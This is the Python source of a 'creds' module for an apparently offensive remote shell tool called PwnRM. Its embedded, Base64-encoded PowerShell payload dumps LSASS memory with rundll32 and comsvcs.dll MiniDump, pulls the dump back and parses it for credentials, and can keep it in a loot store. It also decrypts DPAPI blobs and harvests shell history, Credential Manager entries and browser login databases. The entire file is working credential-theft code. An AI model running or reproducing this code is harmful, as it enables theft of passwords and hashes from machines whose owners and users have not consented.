"""Credential artifact reconnaissance and explicit current-user DPAPI unprotect."""

import base64
import secrets
from pathlib import PureWindowsPath
from typing import List, Any

from . import BaseModule
from ..core.credential_dump import parse_lsass_minidump, zeroize
from ..shell.ui import c, M, BLD
from ..shell.commands import b64str


class CredsModule(BaseModule):
    name = "creds"
    description = "Credential artifact inventory, DPAPI unprotect, and ephemeral LSASS parsing"
    author = "uziii2208"
    options = {
        "vault": {"desc": "Enumerate Windows Credential Manager and Vault metadata"},
        "dpapi": {"desc": "Enumerate current-user DPAPI master-key files"},
        "decrypt": {"desc": "Unprotect one Base64 DPAPI blob as the current user: decrypt <B64>"},
        "history": {"desc": "Display recent PowerShell console history"},
        "browser": {"desc": "Locate Chrome, Edge and Brave credential database artifacts"},
        "lsa": {"desc": "Parse an ephemeral LSASS minidump (administrator/SeDebug required)"},
        "--lsa-output": {"desc": "Remote temporary path used with lsa; always deleted"},
        "--download": {"desc": "Retain the raw LSASS dump in the local PwnRM loot store"},
    }

    def run(self, shell, args: List[str]) -> Any:
        selected = set()
        decrypt_blob = ""
        lsa_output = ""
        retain_download = False
        idx = 0
        while idx < len(args):
            raw_arg = args[idx]
            lowered = raw_arg.lower()
            arg = lowered[2:] if lowered in {"--vault", "--dpapi", "--decrypt", "--history", "--browser", "--lsa"} else lowered
            if arg == "decrypt":
                if idx + 1 >= len(args):
                    shell.write_warning("  [-] decrypt requires a Base64 DPAPI blob.")
                    return {"status": "error", "error": "missing DPAPI blob"}
                decrypt_blob = args[idx + 1]
                try:
                    decoded = base64.b64decode(decrypt_blob, validate=True)
                except (ValueError, base64.binascii.Error):
                    decoded = b""
                if not decoded or len(decoded) > 4 * 1024 * 1024:
                    shell.write_warning("  [-] DPAPI input must be valid non-empty Base64 and no larger than 4 MiB decoded.")
                    return {"status": "error", "error": "invalid DPAPI blob"}
                selected.add(arg)
                idx += 2
                continue
            if arg == "--lsa-output":
                if idx + 1 >= len(args):
                    shell.write_warning("  [-] --lsa-output requires an absolute remote Windows path.")
                    return {"status": "error", "error": "missing LSASS output path"}
                lsa_output = args[idx + 1]
                path = PureWindowsPath(lsa_output)
                if (
                    not path.is_absolute()
                    or len(lsa_output) > 240
                    or any(char in lsa_output for char in "*?\r\n\x00")
                ):
                    shell.write_warning("  [-] --lsa-output must be an absolute remote Windows path without wildcards.")
                    return {"status": "error", "error": "invalid LSASS output path"}
                idx += 2
                continue
            if arg == "--download":
                retain_download = True
                idx += 1
                continue
            if arg in {"vault", "dpapi", "history", "browser", "lsa"}:
                selected.add(arg)
                idx += 1
                continue
            shell.write_warning(f"  [-] Unknown credential mode or option: {raw_arg}")
            return {"status": "error", "error": "invalid option"}

        if lsa_output and "lsa" not in selected:
            shell.write_warning("  [-] --lsa-output is only valid together with the lsa mode.")
            return {"status": "error", "error": "LSASS output path without lsa mode"}
        if retain_download and "lsa" not in selected:
            shell.write_warning("  [-] --download is only valid together with the lsa mode.")
            return {"status": "error", "error": "download without lsa mode"}

        if not selected:
            selected = {"vault", "dpapi", "history", "browser"}

        if "lsa" in selected and not lsa_output:
            try:
                remote_temp = shell._validate_remote_path(
                    shell.run_sync("[System.IO.Path]::GetTempPath()").strip()
                )
                lsa_output = str(
                    PureWindowsPath(remote_temp) /
                    f"pwnrm_lsass_{secrets.token_hex(16)}.dmp"
                )
            except (OSError, ValueError) as exc:
                shell.write_error(f"  [-] Could not resolve a safe remote LSASS staging path: {exc}")
                return {"status": "error", "error": "unsafe LSASS staging path"}

        if "lsa" in selected:
            exists = shell.run_sync(
                f"Test-Path -LiteralPath '{shell._pse(lsa_output)}'"
            ).strip().lower() == "true"
            if exists:
                shell.write_error(f"  [-] Refusing to overwrite existing remote path: {lsa_output}")
                return {"status": "error", "error": "LSASS staging path already exists"}

        shell.write_info(c(M + BLD, "  [*] PwnRM Creds Engine — scanning selected credential artifact locations..."))

        ps = r'''
$ErrorActionPreference = 'SilentlyContinue'
$doVault = __DO_VAULT__
$doDpapi = __DO_DPAPI__
$doDecrypt = __DO_DECRYPT__
$doHistory = __DO_HISTORY__
$doBrowser = __DO_BROWSER__
$doLsa = __DO_LSA__
$decryptBlob = '__DECRYPT_BLOB__'
$lsaOutput = '__LSA_OUTPUT__'

Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM Credential Artifact Inventory" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

if ($doHistory) {
    Write-Host "[PowerShell History]" -ForegroundColor Yellow
    $histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path -LiteralPath $histPath) {
        Write-Host "  [+] FOUND: $histPath" -ForegroundColor Green
        Get-Content -LiteralPath $histPath | Select-Object -Last 15 | ForEach-Object {
            Write-Host "      $_" -ForegroundColor DarkGray
        }
    } else {
        Write-Host "  [-] No PSReadLine history for the current profile." -ForegroundColor Gray
    }
}

if ($doVault) {
    Write-Host "`n[Credential Manager / Vault Metadata]" -ForegroundColor Yellow
    $cmdkey = cmdkey.exe /list 2>$null
    if ($cmdkey) { $cmdkey | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray } }
    $vault = vaultcmd.exe /listcreds:"Windows Credentials" 2>$null
    if ($vault) { $vault | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray } }
    if (-not $cmdkey -and -not $vault) {
        Write-Host "  [-] No accessible Credential Manager or Vault metadata." -ForegroundColor Gray
    }
}

if ($doDpapi) {
    Write-Host "`n[Current-user DPAPI Master Keys]" -ForegroundColor Yellow
    $dpapiUser = "$env:APPDATA\Microsoft\Protect"
    if (Test-Path -LiteralPath $dpapiUser) {
        $keys = @(Get-ChildItem -LiteralPath $dpapiUser -Recurse -Force | Where-Object { -not $_.PSIsContainer })
        Write-Host "  [+] DPAPI master-key files found: $($keys.Count)" -ForegroundColor Green
        $keys | Select-Object -First 20 | ForEach-Object {
            Write-Host "      - $($_.FullName)" -ForegroundColor Gray
        }
    } else {
        Write-Host "  [-] Current-user DPAPI Protect directory was not found." -ForegroundColor Gray
    }
}

if ($doDecrypt) {
    Write-Host "`n[Current-user DPAPI Unprotect]" -ForegroundColor Yellow
    $dpapiTypeDef = @"
using System;
using System.Runtime.InteropServices;
public class PwnRMCurrentUserDPAPI {
    [StructLayout(LayoutKind.Sequential)]
    public struct DATA_BLOB { public int cbData; public IntPtr pbData; }

    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CryptUnprotectData(ref DATA_BLOB input, IntPtr description,
        IntPtr entropy, IntPtr reserved, IntPtr prompt, int flags, ref DATA_BLOB output);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LocalFree(IntPtr memory);

    public static byte[] Unprotect(byte[] cipher) {
        DATA_BLOB input = new DATA_BLOB();
        DATA_BLOB output = new DATA_BLOB();
        try {
            input.cbData = cipher.Length;
            input.pbData = Marshal.AllocHGlobal(cipher.Length);
            Marshal.Copy(cipher, 0, input.pbData, cipher.Length);
            if (!CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                                    IntPtr.Zero, 0, ref output)) {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
            }
            byte[] plain = new byte[output.cbData];
            Marshal.Copy(output.pbData, plain, 0, output.cbData);
            return plain;
        } finally {
            if (input.pbData != IntPtr.Zero) Marshal.FreeHGlobal(input.pbData);
            if (output.pbData != IntPtr.Zero) LocalFree(output.pbData);
        }
    }
}
"@
    try {
        if (-not ('PwnRMCurrentUserDPAPI' -as [type])) {
            Add-Type -TypeDefinition $dpapiTypeDef -ErrorAction Stop
        }
        $cipher = [Convert]::FromBase64String($decryptBlob)
        $plain = [PwnRMCurrentUserDPAPI]::Unprotect($cipher)
        Write-Host "  [+] Plaintext bytes (Base64): $([Convert]::ToBase64String($plain))" -ForegroundColor Green
        [Array]::Clear($plain, 0, $plain.Length)
        [Array]::Clear($cipher, 0, $cipher.Length)
    } catch {
        Write-Error "DPAPI unprotect failed in the current user context: $($_.Exception.Message)"
    }
}

if ($doBrowser) {
    Write-Host "`n[Browser Credential Artifacts]" -ForegroundColor Yellow
    $relativePaths = @(
        "AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "AppData\Local\Google\Chrome\User Data\Local State",
        "AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
        "AppData\Local\Microsoft\Edge\User Data\Local State",
        "AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
        "AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
    )
    $found = 0
    foreach ($relative in $relativePaths) {
        $path = Join-Path $env:USERPROFILE $relative
        if (Test-Path -LiteralPath $path) {
            $found++
            Write-Host "  [+] $path" -ForegroundColor Green
        }
    }
    if ($found -eq 0) { Write-Host "  [-] No supported browser artifact was found." -ForegroundColor Gray }
}

if ($doLsa) {
    Write-Host "`n[LSASS Full Minidump Staging]" -ForegroundColor Yellow
    $dumpPath = $null
    $previousErrorAction = $ErrorActionPreference
    $ErrorActionPreference = 'Stop'
    try {
        $dumpPath = if ($lsaOutput) {
            [Environment]::ExpandEnvironmentVariables($lsaOutput)
        } else {
            Join-Path $env:TEMP ("pwnrm_lsass_{0}.dmp" -f [Guid]::NewGuid().ToString('N'))
        }
        $dumpParent = [IO.Path]::GetDirectoryName($dumpPath)
        if (-not $dumpParent -or -not (Test-Path -LiteralPath $dumpParent -PathType Container)) {
            throw "Dump parent directory does not exist: $dumpParent"
        }
        if (Test-Path -LiteralPath $dumpPath) {
            throw "Refusing to overwrite an existing dump: $dumpPath"
        }

        $lsass = Get-Process -Name lsass -ErrorAction Stop | Select-Object -First 1
        $rundll32 = Join-Path $env:WINDIR 'System32\rundll32.exe'
        $comsvcs = Join-Path $env:WINDIR 'System32\comsvcs.dll'
        $comsvcsEntry = $comsvcs + ','

        # Windows PowerShell's Start-Process joins ArgumentList values into a
        # single string.  That changes the significant `comsvcs.dll,` token on
        # some hosts (ERROR_INVALID_NAME).  The call operator preserves each
        # native argument.  Since rundll32 is a GUI-subsystem binary, track its
        # exact worker by the unique dump path instead of relying on -Wait.
        & $rundll32 $comsvcsEntry MiniDump $lsass.Id $dumpPath full
        $dumpDeadline = [DateTime]::UtcNow.AddSeconds(180)
        do {
            $dumpWorkers = @(
                Get-CimInstance Win32_Process -Filter "Name = 'rundll32.exe'" -ErrorAction SilentlyContinue |
                    Where-Object { $_.CommandLine -and $_.CommandLine.Contains($dumpPath) }
            )
            if ($dumpWorkers.Count -eq 0) { break }
            Start-Sleep -Milliseconds 250
        } while ([DateTime]::UtcNow -lt $dumpDeadline)
        if ($dumpWorkers.Count -gt 0) {
            foreach ($worker in $dumpWorkers) {
                Stop-Process -Id ([int]$worker.ProcessId) -Force -ErrorAction SilentlyContinue
            }
            throw "MiniDump worker timed out after 180 seconds"
        }

        $dump = Get-Item -LiteralPath $dumpPath -ErrorAction Stop
        if ($dump.Length -le 0) {
            throw "MiniDump created an empty file"
        }
        $dumpHash = (Get-FileHash -LiteralPath $dumpPath -Algorithm SHA256 -ErrorAction Stop).Hash
        Write-Host "  [+] LSASS dump staged : $dumpPath" -ForegroundColor Green
        Write-Host "      Size              : $($dump.Length) bytes" -ForegroundColor Gray
        Write-Host "      SHA-256           : $dumpHash" -ForegroundColor Gray
        Write-Host "  [*] PwnRM will parse this dump and remove it immediately." -ForegroundColor Cyan
    } catch {
        $failure = $_.Exception.Message
        if ($dumpPath) {
            Get-CimInstance Win32_Process -Filter "Name = 'rundll32.exe'" -ErrorAction SilentlyContinue |
                Where-Object { $_.CommandLine -and $_.CommandLine.Contains($dumpPath) } |
                ForEach-Object {
                    Stop-Process -Id ([int]$_.ProcessId) -Force -ErrorAction SilentlyContinue
                }
        }
        if ($dumpPath -and (Test-Path -LiteralPath $dumpPath)) {
            Remove-Item -LiteralPath $dumpPath -Force -ErrorAction SilentlyContinue
        }
        Write-Error "LSASS dump failed (administrator/SeDebug required; PPL/EDR may block access): $failure" -ErrorAction Continue
    } finally {
        $ErrorActionPreference = $previousErrorAction
    }
}

Write-Host "`n  [*] Credential artifact scan complete." -ForegroundColor Cyan
'''
        replacements = {
            "__DO_VAULT__": "$true" if "vault" in selected else "$false",
            "__DO_DPAPI__": "$true" if "dpapi" in selected else "$false",
            "__DO_DECRYPT__": "$true" if "decrypt" in selected else "$false",
            "__DO_HISTORY__": "$true" if "history" in selected else "$false",
            "__DO_BROWSER__": "$true" if "browser" in selected else "$false",
            "__DO_LSA__": "$true" if "lsa" in selected else "$false",
            "__DECRYPT_BLOB__": decrypt_blob,
            "__LSA_OUTPUT__": lsa_output.replace("'", "''"),
        }
        for marker, value in replacements.items():
            ps = ps.replace(marker, value)

        encoded = b64str(ps.encode("utf-16le"))
        command = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        error_count = len(getattr(shell, "last_run_errors", []))
        interrupted = shell.run_with_interrupt(command, shell.write_line)
        if "lsa" not in selected:
            if interrupted:
                return {"status": "interrupted"}
            return {"status": "completed", "selected": sorted(selected)}

        dump_data = None
        result = {"status": "interrupted"} if interrupted else {"status": "error"}
        try:
            new_errors = getattr(shell, "last_run_errors", [])[error_count:]
            if interrupted:
                pass
            elif new_errors:
                result = {
                    "status": "error",
                    "error": "; ".join(new_errors),
                    "selected": sorted(selected),
                }
            else:
                shell.write_info(c(M + BLD, "\n  [*] Streaming LSASS dump into protected operator memory..."))
                dump_data = shell.read_remote_file(lsa_output)
                records = parse_lsass_minidump(dump_data)
                shell.write_info(c(M + BLD, "\n  [*] Extracted LSASS credential material"))
                if records:
                    for record in records:
                        shell.write_info(f"    {record}")
                else:
                    shell.write_warning("  [-] No printable LSASS credential material was extracted.")

                retained = []
                if retain_download:
                    target = str(getattr(shell, "target_info", {}).get("host", "target"))
                    saved = shell.loot_mgr.store_artifact(
                        target,
                        "dumps",
                        PureWindowsPath(lsa_output).name,
                        dump_data,
                        source_command="!creds lsa --download",
                    )
                    retained.append(saved)
                    shell.write_info(c(M, f"  [+] Retained LSASS dump: {saved}"))
                result = {
                    "status": "completed",
                    "selected": sorted(selected),
                    "records": len(records),
                    "downloaded": retained,
                }
        except Exception as exc:
            shell.write_error(f"  [-] LSASS parsing failed: {exc}")
            result = {
                "status": "error",
                "error": str(exc),
                "selected": sorted(selected),
            }
        finally:
            if dump_data is not None:
                zeroize([dump_data])
            try:
                cleaned = shell.delete_remote_path(lsa_output)
            except Exception as exc:
                cleaned = False
                shell.write_error(f"  [-] Remote LSASS cleanup failed: {exc}")
            if not cleaned:
                shell.write_error(f"  [-] Remote LSASS dump still requires cleanup: {lsa_output}")
                result = {
                    "status": "error",
                    "error": "remote LSASS cleanup failed",
                    "path": lsa_output,
                    "selected": sorted(selected),
                }
            else:
                shell.write_info(c(M, f"  [+] Remote LSASS dump removed: {lsa_output}"))
        return result
